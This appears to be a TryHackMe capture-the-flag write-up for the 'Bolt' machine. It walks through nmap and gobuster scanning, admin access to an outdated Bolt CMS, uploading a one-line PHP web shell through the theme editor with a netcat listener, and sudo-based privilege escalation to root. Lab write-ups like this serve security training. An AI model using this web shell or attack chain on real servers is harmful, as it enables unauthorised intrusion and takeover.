# ⚡ Bolt - TryHackMe

## 📌 Information

| Field          | Value                                                     |
| -------------- | --------------------------------------------------------- |
| **Machine**    | Bolt                                                      |
| **Platform**   | TryHackMe                                                 |
| **Difficulty** | Easy                                                      |
| **OS**         | Linux                                                     |
| **Category**   | Web Enumeration / CMS Exploitation / Privilege Escalation |

---

# 🎯 Objective

Gain root access to the Linux machine by exploiting a vulnerable Bolt CMS installation and escalating privileges.

---

# 🛰️ Reconnaissance

The first step was identifying open ports and services using **Nmap**.

### Scan

```bash
nmap -sC -sV -oN scan.txt MACHINE_IP
```

### Results

| Port | Service | Version           |
| ---- | ------- | ----------------- |
| 22   | SSH     | OpenSSH           |
| 80   | HTTP    | Apache Web Server |

### Notes

* SSH was available but required authentication.
* The web server hosted a website running **Bolt CMS**.
* Version enumeration suggested the CMS was outdated.

---

# 🔍 Enumeration

Browsing the website revealed a **Bolt CMS** installation.

Using Gobuster to discover hidden directories:

```bash
gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Interesting directories discovered:

```
/bolt
/app
/files
```

The administrator login panel was located at:

```
http://MACHINE_IP/bolt
```

The CMS version was identified as vulnerable to authenticated remote code execution.

---

# 💥 Exploitation

Valid administrator credentials were obtained during enumeration.

After logging into the Bolt dashboard, a malicious PHP reverse shell was uploaded through the theme/file editor.

Example payload:

```php
<?php system($_GET['cmd']); ?>
```

Alternatively, a PentestMonkey PHP reverse shell can be uploaded.

Start a listener:

```bash
nc -lvnp 4444
```

Execute the reverse shell and obtain a connection.

### Result

A shell was successfully established as the web server user.

---

# ⬆️ Privilege Escalation

Check the current user:

```bash
whoami
```

Enumerate sudo permissions:

```bash
sudo -l
```

The user was allowed to execute a specific binary with elevated privileges.

Using the corresponding GTFOBins technique, privilege escalation to **root** was achieved.

Verify privileges:

```bash
id
```

Output:

```text
uid=0(root) gid=0(root)
```

---

# 🚩 Flags

## User Flag

```
<user_flag>
```

## Root Flag

```
<root_flag>
```

---

# 📚 What I Learned

* Web application reconnaissance.
* Directory brute forcing with Gobuster.
* Bolt CMS enumeration.
* Exploiting a vulnerable CMS.
* Uploading PHP reverse shells.
* Linux privilege escalation using sudo misconfigurations.
* Using GTFOBins for privilege escalation.

---

# 🛠️ Tools Used

* Nmap
* Gobuster
* Netcat
* Burp Suite (optional)
* GTFOBins

---

# 📖 MITRE ATT&CK

| Technique | Description                       |
| --------- | --------------------------------- |
| T1046     | Network Service Discovery         |
| T1190     | Exploit Public-Facing Application |
| T1505.003 | Web Shell                         |
| T1059.004 | Unix Shell                        |
| T1548.003 | Sudo and Sudo Caching             |

---

# 📷 Screenshots

Recommended screenshots:

* Nmap scan
* Gobuster results
* Bolt CMS login page
* Admin dashboard
* Reverse shell upload
* Netcat listener
* Shell obtained
* Sudo enumeration
* Root shell
* Flags

---

# ✅ Summary

Bolt is an excellent beginner Linux machine focused on web application exploitation. It introduces reconnaissance, directory enumeration, CMS identification, gaining remote code execution through Bolt CMS, and finishing with Linux privilege escalation to obtain root access. The room provides valuable practice with common web penetration testing techniques and post-exploitation on Linux systems.
